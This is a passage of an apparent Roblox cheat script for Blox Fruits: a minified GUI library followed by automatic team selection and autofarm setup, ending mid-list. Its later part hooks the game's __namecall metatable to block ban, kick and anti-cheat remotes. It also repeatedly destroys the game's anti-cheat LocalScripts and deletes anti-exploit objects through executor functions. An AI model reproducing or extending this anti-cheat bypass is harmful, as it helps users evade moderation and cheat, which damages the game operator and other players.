an=Instance.new("TextLabel",am)an.Name="TextLabel"an.FontFace=Font.new"rbxassetid://12187365364"an.Text=al.Name;an.TextColor3=Color3.fromRGB(62,62,62)an.TextSize=12;an.TextWrapped=true;an.TextXAlignment=Enum.TextXAlignment.Left;an.BackgroundTransparency=1;an.Position=UDim2.new(0,11,0.5,0)an.Size=UDim2.new(1,-102,0,17)an.AnchorPoint=Vector2.new(0,0.5)local ao=Instance.new("Frame",am)ao.Name="TextboxHolder"ao.AnchorPoint=Vector2.new(1,0.5)ao.BackgroundColor3=Color3.fromRGB(86,86,86)ao.BackgroundTransparency=0.95;ao.BorderSizePixel=0;ao.Position=UDim2.new(1,-15,0.5,0)local ap=Library.Layouts[Library.CurrentLayout]ao.Size=ap.Holders.Textbox;local aq=Instance.new("UICorner",ao)aq.CornerRadius=UDim.new(0,4)local ar=Instance.new("UIStroke",ao)ar.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;ar.Color=Color3.fromRGB(56,56,56)ar.Transparency=0.5;local as=Instance.new("Frame",ao)as.Name="Frame"as.AnchorPoint=Vector2.new(0,1)as.BackgroundColor3=Color3.fromRGB(255,188,254)as.BackgroundTransparency=1;as.BorderSizePixel=0;as.Position=UDim2.new(0,2,1,0)as.Size=UDim2.new(1,-4,0,1)local at=Instance.new("Frame",ao)at.Name="Frame"at.BackgroundTransparency=1;at.BorderSizePixel=0;at.ClipsDescendants=true;at.Position=UDim2.fromOffset(6,0)at.Size=UDim2.new(1,-12,1,0)local av=Instance.new("TextBox",at)av.Name="TextBox"av.ClearTextOnFocus=false;av.FontFace=Font.new"rbxassetid://12187365364"av.PlaceholderColor3=Color3.fromRGB(170,170,170)av.PlaceholderText=al.Default;av.Text=""av.TextColor3=Color3.fromRGB(240,240,240)av.TextSize=12;av.TextXAlignment=Enum.TextXAlignment.Left;av.AutomaticSize=Enum.AutomaticSize.Y;av.BackgroundTransparency=1;av.Position=UDim2.fromOffset(2,0)av.Size=UDim2.fromScale(1,1)Library:Connection(av.Focused,function()a1:Create(as,TweenInfo.new(0.2),{BackgroundTransparency=0.5}):Play()a1:Create(an,TweenInfo.new(0.2),{TextColor3=Color3.fromRGB(255,255,255)}):Play()a1:Create(ao,TweenInfo.new(0.2),{BackgroundTransparency=0.87}):Play()end)Library:Connection(av.FocusLost,function(aw)a1:Create(as,TweenInfo.new(0.2),{BackgroundTransparency=1}):Play()a1:Create(an,TweenInfo.new(0.2),{TextColor3=Color3.fromRGB(62,62,62)}):Play()a1:Create(ao,TweenInfo.new(0.2),{BackgroundTransparency=0.95}):Play()if aw then Library.Flags[al.Flag]=av.Text;al.Callback(av.Text)end end)Library:Connection(av:GetPropertyChangedSignal"Text",function()if av:IsFocused()then as.BackgroundTransparency=0.5 end end)function al.Set(aw,ay)av.Text=ay;Library.Flags[al.Flag]=ay;al.Callback(ay)end;Library.Flags[al.Flag]=al.Default;return al end;function l.Keybind(aj,ak)local al=game:GetService"HttpService":GenerateGUID(false)local am=ak or{}local an={UUID=al,Section=aj,Name=am.name or am.Name or"Keybind",State=am.Key or am.key or Enum.KeyCode.E,Mode=am.Mode or am.mode or"Toggle",UseKey=am.UseKey or false,Callback=am.Callback or am.callback or function()end,Flag=am.Flag or am.flag or Library.NextFlag(),Binding=nil}local ao;local ap=false;local aq=Library:Connection(game:GetService"RunService".RenderStepped)local ar=Instance.new("TextButton",an.Section.Elements.SectionContent)ar.Name="Keybind"ar.FontFace=Font.new"rbxasset://fonts/families/SourceSansPro.json"ar.Text=""ar.TextColor3=Color3.fromRGB(0,0,0)ar.TextSize=14;ar.AutoButtonColor=false;ar.AutomaticSize=Enum.AutomaticSize.Y;ar.BackgroundTransparency=1;ar.Size=UDim2.new(1,0,0,25)local as=Instance.new("TextLabel",ar)as.Name="TextLabel"as.FontFace=Font.new"rbxassetid://12187365364"as.Text=an.Name;as.TextColor3=Color3.fromRGB(62,62,62)as.TextSize=12;as.TextWrapped=true;as.TextXAlignment=Enum.TextXAlignment.Left;as.BackgroundTransparency=1;as.Position=UDim2.new(0,11,0.5,0)as.Size=UDim2.new(1,-102,0,17)as.AnchorPoint=Vector2.new(0,0.5)local at=Instance.new("Frame",ar)at.Name="KeybindHolder"at.AnchorPoint=Vector2.new(1,0.5)at.BackgroundColor3=Color3.fromRGB(86,86,86)at.BackgroundTransparency=0.95;at.BorderSizePixel=0;at.Position=UDim2.new(1,-15,0.5,0)local av=Library.Layouts[Library.CurrentLayout]at.Size=av.Holders.Keybind;local aw=Instance.new("UICorner",at)aw.CornerRadius=UDim.new(0,4)local ay=Instance.new("UIStroke",at)ay.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;ay.Color=Color3.fromRGB(56,56,56)ay.Transparency=0.5;local az=Instance.new("Frame",at)az.Name="Frame"az.AnchorPoint=Vector2.new(0,1)az.BackgroundColor3=Color3.fromRGB(255,188,254)az.BackgroundTransparency=1;az.BorderSizePixel=0;az.Position=UDim2.new(0,2,1,0)az.Size=UDim2.new(1,-4,0,1)local aA=Instance.new("TextLabel",at)aA.Name="TextLabel"aA.FontFace=Font.new"rbxassetid://12187365364"aA.Text=an.State and typeof(an.State)=="EnumItem"and an.State.Name or"..."aA.TextColor3=Color3.fromRGB(240,240,240)aA.TextSize=12;aA.TextXAlignment=Enum.TextXAlignment.Center;aA.BackgroundTransparency=1;aA.Size=UDim2.fromScale(1,1)aA:GetPropertyChangedSignal"Text":Connect(function()at.Size=UDim2.new(0,aA.TextBounds.X+20,0,23)end)if not Library.KeybindList.Frame then Library:CreateKeybindList()end;local function ae(aB)if typeof(aB)=="EnumItem"then if aq then aq:Disconnect()if an.Flag then Library.Flags[an.Flag]=false end;an.Callback(false)end;if tostring(aB):find"MouseButton"then return end;if aB==Enum.KeyCode.Backspace then ao=nil;aA.Text="None"else ao=aB;aA.Text=Library.Keys[aB]or tostring(aB):gsub("Enum.KeyCode.","")end;if aB~=nil then Library:UpdateKeybind(an.UUID,Library.Keys[aB]or tostring(aB):gsub("Enum.KeyCode.",""))else Library:UpdateKeybind(an.UUID,"None")end;Library.Flags[an.Flag.."_KEY"]=aB end end;if not Library.KeybindList.Frame then Library:CreateKeybindList()end;Library:AddKeybind(an.UUID,an.Name,Library.Keys[an.State]or tostring(an.State):gsub("Enum.KeyCode.",""))ae(an.State)ar.InputBegan:Connect(function(aB)if aB.UserInputType==Enum.UserInputType.MouseButton1 and not an.Binding then an.Binding=true;aA.Text="..."az.BackgroundTransparency=0.5;a1:Create(as,TweenInfo.new(0.2),{TextColor3=Color3.fromRGB(255,255,255)}):Play()a1:Create(at,TweenInfo.new(0.2),{BackgroundTransparency=0.87}):Play()local aC;aC=game:GetService"UserInputService".InputBegan:Connect(function(aD)if aD.UserInputType==Enum.UserInputType.Keyboard then ae(aD.KeyCode)a1:Create(az,TweenInfo.new(0.2),{BackgroundTransparency=1}):Play()a1:Create(as,TweenInfo.new(0.2),{TextColor3=Color3.fromRGB(62,62,62)}):Play()a1:Create(at,TweenInfo.new(0.2),{BackgroundTransparency=0.95}):Play()aC:Disconnect()an.Binding=false end end)end end)game:GetService"UserInputService".InputBegan:Connect(function(aB)if aB.UserInputType==Enum.UserInputType.Keyboard and aB.KeyCode==ao and not an.Binding then if an.Mode=="Toggle"then ap=not ap;if an.Flag then Library.Flags[an.Flag]=ap end;Library:UpdateKeybindState(an.UUID,ap)an.Callback(ap)elseif an.Mode=="Hold"then ap=true;if an.Flag then Library.Flags[an.Flag]=true end;Library:UpdateKeybindState(an.UUID,true)aq=game:GetService"RunService".RenderStepped:Connect(function()an.Callback(true)end)end end end)game:GetService"UserInputService".InputEnded:Connect(function(aB)if aB.UserInputType==Enum.UserInputType.Keyboard and aB.KeyCode==ao and an.Mode=="Hold"then ap=false;if aq then aq:Disconnect()if an.Flag then Library.Flags[an.Flag]=false end;Library:UpdateKeybindState(an.UUID,false)an.Callback(false)end end end)function an.Set(aB,aC)ae(aC)end;function an.ChangeMode(aB,aC)if aC~="Toggle"and aC~="Hold"then warn"Must be 'Toggle' or 'Hold'"return end;if aB.Mode=="Hold"and aq then aq:Disconnect()if aB.Flag then Library.Flags[aB.Flag]=false end;Library:UpdateKeybindState(aB.UUID,false)aB.Callback(false)end;aB.Mode=aC;ap=false;if aB.Flag then Library.Flags[aB.Flag]=false end;Library:UpdateKeybindState(aB.UUID,false)end;return an end;function l.Dropdown(aj,ak)aj.Dropdowncount=(aj.Dropdowncount or 0)+1;local al={Name=ak.Name or"Dropdown",Options=ak.Options or{},Default=ak.Default or"",Max=ak.Max,ScrollMax=ak.ScrollMax,Flag=ak.Flag or Library.NextFlag(),Callback=ak.Callback or function()end,Zindex=ak.Zindex or 1000-aj.Dropdowncount,Section=aj,OptionInsts={}}local am=Instance.new("TextButton",al.Section.Elements.SectionContent)am.Name="Dropdown"am.FontFace=Font.new"rbxasset://fonts/families/SourceSansPro.json"am.Text=""am.TextColor3=Color3.fromRGB(0,0,0)am.TextSize=14;am.ZIndex=al.Zindex;am.AutoButtonColor=false;am.BackgroundTransparency=1;am.Size=UDim2.new(1,0,0,25)local an=Instance.new("TextLabel",am)an.Name="TextLabel"an.FontFace=Font.new"rbxassetid://12187365364"an.Text=al.Name;an.TextColor3=Color3.fromRGB(62,62,62)an.TextSize=12;an.TextWrapped=true;an.TextXAlignment=Enum.TextXAlignment.Left;an.BackgroundTransparency=1;an.Position=UDim2.new(0,11,0.5,0)an.Size=UDim2.new(1,-133,0,17)an.AnchorPoint=Vector2.new(0,0.5)local ao=Instance.new("Frame",am)ao.Name="DropdownHolder"ao.AnchorPoint=Vector2.new(1,0.5)ao.BackgroundColor3=Color3.fromRGB(86,86,86)ao.BackgroundTransparency=0.95;ao.BorderSizePixel=0;ao.ZIndex=al.Zindex;ao.Position=UDim2.new(1,-15,0.5,0)local ap=Library.Layouts[Library.CurrentLayout]local aq=game:GetService"UserInputService"local ar=aq.TouchEnabled;local as=ar and 136 or 105;if ar then ao.Size=UDim2.new(0.425,0,0,26)else ao.Size=ap.Holders.Dropdown end;local at=Instance.new("UICorner",ao)at.CornerRadius=UDim.new(0,4)local av=Instance.new("UIStroke",ao)av.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;av.Color=Color3.fromRGB(56,56,56)av.Transparency=0.5;local aw=Instance.new("TextLabel",ao)aw.Name="TextLabel"aw.FontFace=Font.new"rbxassetid://12187365364"aw.Text=""aw.TextColor3=Library.Accent;aw.TextSize=12;aw.TextXAlignment=Enum.TextXAlignment.Left;aw.BackgroundTransparency=1;aw.Position=UDim2.fromOffset(8,0)aw.Size=UDim2.fromScale(1,1)aw.TextTruncate=Enum.TextTruncate.AtEnd;aw.Size=UDim2.new(1,-25,1,0)local ay=Instance.new("ImageLabel",ao)ay.Name="Arrow"ay.Image="rbxassetid://10709790948"ay.ImageColor3=Color3.fromRGB(170,170,170)ay.AnchorPoint=Vector2.new(1,0.5)ay.BackgroundTransparency=1;ay.Position=UDim2.new(1,-7,0.5,0)ay.Size=UDim2.fromOffset(14,13)local az=Instance.new("Frame",ao)az.Name="List"az.BackgroundColor3=Color3.fromRGB(23,23,24)az.BackgroundTransparency=0;az.BorderSizePixel=0;if ar then az.Position=UDim2.new(-0.2,0,1.1,0)az.Size=UDim2.new(1.4,0,0,as)else az.Position=UDim2.fromScale(0,1.36)az.Size=UDim2.new(1,0,0,as)end;az.Visible=false;az.ZIndex=9999;az.ClipsDescendants=true;local aA=Instance.new("UICorner",az)aA.CornerRadius=UDim.new(0,4)local aB=Instance.new("UIStroke",az)aB.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;aB.Color=Color3.fromRGB(56,56,56)aB.Transparency=0.5;local aC=Instance.new("TextButton",ao)aC.Name="BackgroundOverlay"aC.BackgroundColor3=Color3.fromRGB(0,0,0)aC.BackgroundTransparency=0.7;aC.BorderSizePixel=0;aC.Text=""aC.ZIndex=9998;aC.Size=UDim2.fromScale(20,20)aC.Position=UDim2.fromScale(-10,-10)aC.Visible=false;aC.AutoButtonColor=false;local aD=Instance.new("ScrollingFrame",az)aD.Name="Options"aD.BackgroundTransparency=1;aD.BorderSizePixel=0;aD.Size=UDim2.fromScale(1,1)aD.ScrollBarThickness=ar and 6 or 4;aD.ZIndex=10000;local aE=Instance.new("UIListLayout",aD)aE.Padding=UDim.new(0,ar and 8 or 6)aE.SortOrder=Enum.SortOrder.LayoutOrder;local aF=Instance.new("UIPadding",aD)aF.PaddingTop=UDim.new(0,ar and 6 or 2)aF.PaddingBottom=UDim.new(0,ar and 10 or 6)aF.PaddingLeft=UDim.new(0,ar and 10 or 0)aF.PaddingRight=UDim.new(0,ar and 10 or 0)local aG=al.Max and{}or nil;local aH=0;local function aJ(a2)az.Visible=a2;aC.Visible=a2;if a2 then am.ZIndex=59;a1:Create(an,TweenInfo.new(0.35,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=Color3.fromRGB(255,255,255)}):Play()a1:Create(ay,TweenInfo.new(0.35,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Rotation=180}):Play()else am.ZIndex=56;a1:Create(an,TweenInfo.new(0.35,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=Color3.fromRGB(62,62,62)}):Play()a1:Create(ay,TweenInfo.new(0.35,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Rotation=0}):Play()end end;local function aK(a2)for aL,aM in next,a2 do al.OptionInsts[aM]={}local aN=Instance.new("TextLabel",aD)aN.Name=aM;aN.FontFace=Font.new"rbxasset://fonts/families/Ubuntu.json"aN.Text=aM;aN.TextColor3=Color3.fromRGB(120,120,120)aN.TextSize=11;aN.TextXAlignment=Enum.TextXAlignment.Left;aN.BackgroundTransparency=1;aN.Size=UDim2.new(1,0,0,22)aN.ZIndex=10001;local aO=Instance.new("TextButton",aN)aO.BackgroundTransparency=1;aO.Size=UDim2.fromScale(1,1)aO.Text=""aO.ZIndex=10001;local aP=Instance.new("UIPadding",aN)aP.PaddingLeft=UDim.new(0,8)al.OptionInsts[aM]={button=aO,text=aN}aH=aH+1;Library:Connection(aO.InputBegan,function(aQ)if aQ.UserInputType==Enum.UserInputType.MouseButton1 or aQ.UserInputType==Enum.UserInputType.Touch then if al.Max then if table.find(aG,aM)then table.remove(aG,table.find(aG,aM))a1:Create(aN,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=Color3.fromRGB(120,120,120)}):Play()else if#aG==al.Max then table.remove(aG,1)end;table.insert(aG,aM)a1:Create(aN,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=Color3.fromRGB(255,188,254)}):Play()end;local aR={}for aS,aT in next,aG do table.insert(aR,aT)end;aw.Text=#aG==0 and""or table.concat(aR,",")else for aR,aS in next,al.OptionInsts do a1:Create(aS.text,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=aR==aM and Color3.fromRGB(255,188,254)or Color3.fromRGB(120,120,120)}):Play()end;aG=aM;aw.Text=aM;aJ(false)end;Library.Flags[al.Flag]=aG;al.Callback(aG)end end)if al.ScrollMax then aD.AutomaticCanvasSize=Enum.AutomaticSize.None;if aH<al.ScrollMax then aD.CanvasSize=UDim2.new(0,0,0,aH*22)else aD.CanvasSize=UDim2.new(0,0,0,al.ScrollMax*22)end else aD.AutomaticCanvasSize=Enum.AutomaticSize.Y end end;Library:Connection(am.InputBegan,function(aL)if aL.UserInputType==Enum.UserInputType.MouseButton1 or aL.UserInputType==Enum.UserInputType.Touch then aJ(not az.Visible)end end)Library:Connection(aC.InputBegan,function(aL)if aL.UserInputType==Enum.UserInputType.MouseButton1 or aL.UserInputType==Enum.UserInputType.Touch then aJ(false)end end)end;aK(al.Options)function al.Set(aL,aM)if al.Max then table.clear(aG)aM=type(aM)=="table"and aM or{}for aN,aO in next,al.OptionInsts do if not table.find(aM,aN)then a1:Create(aO.text,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=Color3.fromRGB(120,120,120)}):Play()end end;for aN,aO in next,aM do if table.find(al.Options,aO)and#aG<al.Max then table.insert(aG,aO)a1:Create(al.OptionInsts[aO].text,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=Color3.fromRGB(255,188,254)}):Play()end end;local aN={}for aO,aP in next,aG do table.insert(aN,aP)end;aw.Text=#aG==0 and""or table.concat(aN,", ")else if table.find(al.Options,aM)then aG=aM;aw.Text=aM;for aN,aO in next,al.OptionInsts do a1:Create(aO.text,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=aN==aM and Color3.fromRGB(255,188,254)or Color3.fromRGB(120,120,120)}):Play()end end end;Library.Flags[al.Flag]=aG;al.Callback(aG)end;function al.Refresh(aL,aM)for aN,aO in next,al.OptionInsts do aO.text:Destroy()end;table.clear(al.OptionInsts)al.Options=aM;aK(aM)if al.Max then table.clear(aG)else aG=nil end;aw.Text=""Library.Flags[al.Flag]=aG;al.Callback(aG)end;if al.Default then if al.Max then local aL=type(al.Default)=="table"and al.Default or{al.Default}al:Set(aL)else al:Set(al.Default)end end;return al end;function l.Slider(aj,ak)local al={Name=ak.Name or"Slider",Min=ak.Min or 0,Max=ak.Max or 100,Default=ak.Default or 50,Decimals=ak.Decimals or 1,Flag=ak.Flag or Library.NextFlag(),Callback=ak.Callback or function()end,Section=aj}local am=Instance.new("TextButton",al.Section.Elements.SectionContent)am.Name="RealSlider"am.Text=""am.Active=false;am.BackgroundTransparency=1;am.BorderSizePixel=0;am.Selectable=false;am.Size=UDim2.new(1,0,0,25)local an=Instance.new("UIPadding",am)an.PaddingBottom=UDim.new(0,10)local ao=Instance.new("TextLabel",am)ao.Name="TextLabel"ao.FontFace=Font.new"rbxassetid://12187365364"ao.Text=al.Name;ao.TextColor3=Color3.fromRGB(62,62,62)ao.TextSize=12;ao.TextWrapped=true;ao.TextXAlignment=Enum.TextXAlignment.Left;ao.AnchorPoint=Vector2.new(0,0.5)ao.BackgroundTransparency=1;ao.Position=UDim2.new(0,11,0.5,-1)ao.Size=UDim2.new(1,-52,0,17)local ap=Instance.new("Frame",ao)ap.Name="Frame"ap.BackgroundColor3=Color3.fromRGB(255,255,255)ap.BackgroundTransparency=1;ap.Position=UDim2.new(0,-1,1,4)ap.Size=UDim2.new(1,24,0,5)local aq=Instance.new("TextBox",ap)aq.Name="SliderCount"aq.FontFace=Font.new"rbxassetid://12187365364"aq.RichText=true;aq.Text=tostring(al.Default)aq.TextColor3=Color3.fromRGB(100,100,100)aq.TextSize=12;aq.TextXAlignment=Enum.TextXAlignment.Right;aq.TextYAlignment=Enum.TextYAlignment.Top;aq.BackgroundTransparency=1;aq.Position=UDim2.fromOffset(48,-17)aq.Size=UDim2.new(1,-48,1,2)aq.ClipsDescendants=false;local ar=Instance.new("UICorner",ap)ar.CornerRadius=UDim.new(0,24)local as=Instance.new("Frame",ap)as.Name="RealSlider_indicator"as.BackgroundColor3=Color3.fromRGB(158,114,158)as.BorderSizePixel=0;as.Size=UDim2.new(0,0,1,0)local at=Instance.new("Frame",as)at.Name="Frame"at.BackgroundColor3=Color3.fromRGB(255,188,254)at.BorderSizePixel=0;at.Position=UDim2.fromScale(1,-0.6)at.Size=UDim2.fromOffset(11,11)Instance.new("UICorner",at).CornerRadius=UDim.new(0,34)Instance.new("UICorner",as).CornerRadius=UDim.new(0,24)local av=Instance.new("UIStroke",ap)av.Color=Color3.fromRGB(30,30,30)local aw=false;local ay=al.Default;local function aU(az)az=math.clamp(Library:Round(az,al.Decimals),al.Min,al.Max)local aA=(az-al.Min)/(al.Max-al.Min)a1:Create(as,TweenInfo.new(0.20,Enum.EasingStyle.Sine),{Size=UDim2.new(aA,0,1,0)}):Play()aq.Text=tostring(az)Library.Flags[al.Flag]=az;al.Callback(az)end;local function aV(az)local aA=(az.Position.X-ap.AbsolutePosition.X)/ap.AbsoluteSize.X;local aB=(al.Max-al.Min)*aA+al.Min;aU(aB)end;local function aW(az)az.InputBegan:Connect(function(aA)if aA.UserInputType==Enum.UserInputType.MouseButton1 or aA.UserInputType==Enum.UserInputType.Touch then aw=true;aV(aA)a1:Create(ao,TweenInfo.new(0.25,Enum.EasingStyle.Sine),{TextColor3=Color3.fromRGB(255,255,255)}):Play()end end)az.InputEnded:Connect(function(aA)if aA.UserInputType==Enum.UserInputType.MouseButton1 or aA.UserInputType==Enum.UserInputType.Touch then aw=false;a1:Create(ao,TweenInfo.new(0.25,Enum.EasingStyle.Sine),{TextColor3=Color3.fromRGB(62,62,62)}):Play()end end)end;aW(ap)aW(as)aW(at)game:GetService"UserInputService".InputChanged:Connect(function(az)if(az.UserInputType==Enum.UserInputType.MouseMovement or az.UserInputType==Enum.UserInputType.Touch)and aw then aV(az)end end)aq.Focused:Connect(function()a1:Create(ao,TweenInfo.new(0.20,Enum.EasingStyle.Sine),{TextColor3=Color3.fromRGB(255,255,255)}):Play()end)aq.FocusLost:Connect(function()local az=tonumber(aq.Text)if az then aU(az)else aq.Text=tostring(Library.Flags[al.Flag])end;a1:Create(ao,TweenInfo.new(0.25,Enum.EasingStyle.Sine),{TextColor3=Color3.fromRGB(62,62,62)}):Play()end)aU(al.Default)function al.Set(az,aA)aU(aA)end;return al end;function l.Button(aj,ak)local al={Window=aj.Window,Page=aj.Page,Section=aj,Name=ak.Name or"button",Callback=ak.Callback or function()end}local am=Instance.new"Frame"am.Name="Button_frame"am.BackgroundColor3=Color3.fromRGB(28,29,32)am.BorderColor3=Color3.fromRGB(0,0,0)am.BackgroundTransparency=1;am.BorderSizePixel=0;am.Size=UDim2.new(1,0,0,30)local an=Instance.new"TextButton"an.Name="Button_detector"an.AnchorPoint=Vector2.new(0.5,0.5)an.FontFace=Font.new"rbxasset://fonts/families/SourceSansPro.json"an.Text=""an.TextColor3=Color3.fromRGB(0,0,0)an.TextSize=14;an.BackgroundColor3=Color3.fromRGB(28,29,32)an.BorderColor3=Color3.fromRGB(0,0,0)an.BorderSizePixel=0;an.Size=UDim2.new(0,191,0,26)an.Position=UDim2.new(0.5,0,0.5,0)an.AutoButtonColor=false;an.Parent=am;local ao=Instance.new"TextLabel"ao.Name="Button_name"ao.AnchorPoint=Vector2.new(0.5,0.5)ao.FontFace=Font.new"rbxasset://fonts/families/Ubuntu.json"ao.Text=al.Name;ao.TextColor3=Color3.fromRGB(120,120,120)ao.TextSize=13;ao.BackgroundColor3=Color3.fromRGB(255,255,255)ao.BackgroundTransparency=1;ao.BorderColor3=Color3.fromRGB(0,0,0)ao.BorderSizePixel=0;ao.Position=UDim2.new(0.5,0,0.5,0)ao.Size=UDim2.new(0,189,0,26)ao.Parent=am;local ap=Instance.new"UICorner"ap.CornerRadius=UDim.new(0,6)ap.Parent=an;am.Parent=al.Section.Elements.SectionContent;an.InputBegan:Connect(function(aq)if aq.UserInputType==Enum.UserInputType.MouseButton1 or aq.UserInputType==Enum.UserInputType.Touch then al.Callback()a1:Create(ao,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=Color3.fromRGB(255,255,255)}):Play()end end)an.InputEnded:Connect(function(aq)if aq.UserInputType==Enum.UserInputType.MouseButton1 or aq.UserInputType==Enum.UserInputType.Touch then a1:Create(ao,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=Color3.fromRGB(120,120,120)}):Play()end end)return al end;function l.Colorpicker(aj,ak)local al=ak or{}local am={Section=aj,Name=al.Name or"Colorpicker",State=al.State or Color3.fromRGB(255,0,0),Alpha=al.Alpha or 1,Callback=al.Callback or function()end,Flag=al.Flag or Library.NextFlag(),Colorpickers=0}local an=Instance.new("TextButton",am.Section.Elements.SectionContent)an.Name="Colorpicker22"an.Text=""an.AutoButtonColor=false;an.BackgroundTransparency=1;an.Size=UDim2.new(1,0,0,25)local ao=Instance.new("TextLabel",an)ao.Name="Colorpickername"ao.FontFace=Font.new"rbxassetid://12187365364"ao.Text=am.Name;ao.TextColor3=Color3.fromRGB(62,62,62)ao.TextSize=12;ao.TextXAlignment=Enum.TextXAlignment.Left;ao.BackgroundTransparency=1;ao.Position=UDim2.new(0,11,0.5,0)ao.Size=UDim2.new(1,-102,0,17)ao.AnchorPoint=Vector2.new(0,0.5)local ap=Instance.new("Frame",an)ap.Name="Colorpickerframe"ap.AnchorPoint=Vector2.new(1,0.5)ap.BackgroundTransparency=1;ap.BackgroundColor3=am.State;ap.Position=UDim2.new(0.996,-15,0.5,0)ap.Size=UDim2.fromOffset(15,15)local aq=Instance.new("UICorner",ap)aq.CornerRadius=UDim.new(0,5)am.Colorpickers=am.Colorpickers+1;local ar=Library:NewPicker(am.Name,am.State,am.Alpha,ap,am.Colorpickers,am.Flag,function(ar)am.Callback(ar)end)function am.Set(as,at)ar:Set(at)end;return am end;return Library end end
    
    



IschooseTeam = function()
    for a, b in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
        if b:FindFirstChild('ChooseTeam') then
            return not (b:FindFirstChild('ChooseTeam').Visible)
        end
    end
end
chooseTeam = function(a)
    for b, c in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
        if c:FindFirstChild('ChooseTeam') and c:FindFirstChild('ChooseTeam').Visible then
            game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('CommF_'):InvokeServer('SetTeam', tostring(a))
        end
    end
end
local a = 'Pirates'
repeat
    wait()
    chooseTeam(a)
until IschooseTeam()
repeat
    wait()
until game:IsLoaded()


if getrawmetatable and setreadonly and newcclosure then
    assert(getrawmetatable)
    local grm = getrawmetatable(game)
    setreadonly(grm, false)
    local old = grm.__namecall
    grm.__namecall = newcclosure(function(self, ...)
        local args = { ... }
        local blockedRemotes = {
            ["BANREMOTE"] = true,
            ["PERMAIDBAN"] = true,
            ["KICKREMOTE"] = true,
            ["BR_KICKPC"] = true,
            ["BR_KICKMOBILE"] = true,
            ["OneMoreTime"] = true,
            ["CHECKER_1"] = true,
            ["TeleportDetect"] = true,
            ["CHECKER"] = true,
            ["GUI_CHECK"] = true,
            ["checkingSPEED"] = true,
            ["PERMA-BAN"] = true,
            ["PERMABAN"] = true,
            ["BreathingHAMON"] = true,
            ["JJARC"] = true,
            ["TakePoisonDamage"] = true,
            ["FORCEFIELD"] = true,
            ["Christmas_Sock"] = true,
            ["VirusCough"] = true,
            ["Symbiote"] = true,
            ["Symbioted"] = true,
            ["RequestAFKDisplay"] = true
        }
        
        if blockedRemotes[tostring(args[1])] then
            warn("Blocked Remote:", tostring(args[1]))
            return
        end
        

        return old(self, ...)
    end)
else
    warn("Ur exec doesn't support getrawmetatable or setreadonly or newcclosure")
end


function CheckAntiCheatBypass()
	for i, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
		if v:IsA("LocalScript") then
			if v.Name == "General" or v.Name == "Shiftlock"  or v.Name == "FallDamage" or v.Name == "4444" or v.Name == "CamBob" or v.Name == "JumpCD" or v.Name == "Looking" or v.Name == "Run" then
                v:Destroy()
                warn("Blocked AC1")
			end
		end
	end
	for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts:GetDescendants()) do
		if v:IsA("LocalScript") then
            if v.Name == "RobloxMotor6DBugFix" or v.Name == "Clans"  or v.Name == "Codes" or v.Name == "CustomForceField" or v.Name == "MenuBloodSp"  or v.Name == "PlayerList" then
				v:Destroy()
                warn("Blocked AC2")
			end
		end
	end
end


local function bypassAntiExploit()
    local executor = string.lower(identifyexecutor())
        if string.find(executor, "xeno") or string.find(executor, "solara") then
        return
else
    if filtergc then
	for _, instance in ipairs(filtergc()) do
		if instance:IsA("AntiExploitSystem") then
			instance:Destroy()
            warn("Blocked AC3")
		end
	end
end
end
end
spawn(function()
while wait() do
pcall(function()
	CheckAntiCheatBypass()
	bypassAntiExploit()
    end)
end
end)

do
    ply = game.Players
    plr = ply.LocalPlayer
    Root = plr.Character.HumanoidRootPart
    replicated = game:GetService('ReplicatedStorage')
    Lv = game.Players.LocalPlayer.Data.Level.Value
    TeleportService = game:GetService('TeleportService')
    TW = game:GetService('TweenService')
    Lighting = game:GetService('Lighting')
    Enemies = workspace.Enemies
    vim1 = game:GetService('VirtualInputManager')
    vim2 = game:GetService('VirtualUser')
    TeamSelf = plr.Team
    RunSer = game:GetService('RunService')
    Stats = game:GetService('Stats')
    Energy = plr.Character.Energy.Value
    Boss = {}
    BringConnections = {}
    MaterialList = {}
    NPCList = {}
    shouldTween = false
    SoulGuitar = false
    KenTest = true
    debug = false
    Quest = false
    Brazier1 = false
    Brazier2 = false
    Brazier3 = false
    _B = true
    _G.Y_Position = true
    Sec = 0.1
    BoatY = 31
    ClickState = 0
    Num_self = 25
end
World1 = game.PlaceId == 2753915549
World2 = game.PlaceId == 4442272183
World3 = game.PlaceId == 7449423635
Sea = World1 or World2 or World3 or plr:Kick('\u{274c} Error : A[12]Blox Fruits \u{274c}')
Marines = function()
    replicated.Remotes.CommF_:InvokeServer('SetTeam', 'Marines')
end
Pirates = function()
    replicated.Remotes.CommF_:InvokeServer('SetTeam', 'Pirates')
end
if World1 then
    Boss = {
        'The Gorilla King',
        'Bobby',
        'The Saw',
        'Yeti',
        'Mob Leader',
        'Vice Admiral',
        'Saber Expert',
        'Warden',
        'Chief Warden',
        'Swan',
        'Magma Admiral',
        'Fishman Lord',
        'Wysper',
        'Thunder God',
        'Cyborg',
        'Ice Admiral',
        'Greybeard'
    }
elseif World2 then
    Boss = {
        'Diamond',
        'Jeremy',
        'Fajita',
        'Don Swan',
        'Smoke Admiral',
        'Awakened Ice Admiral',
        'Tide Keeper',
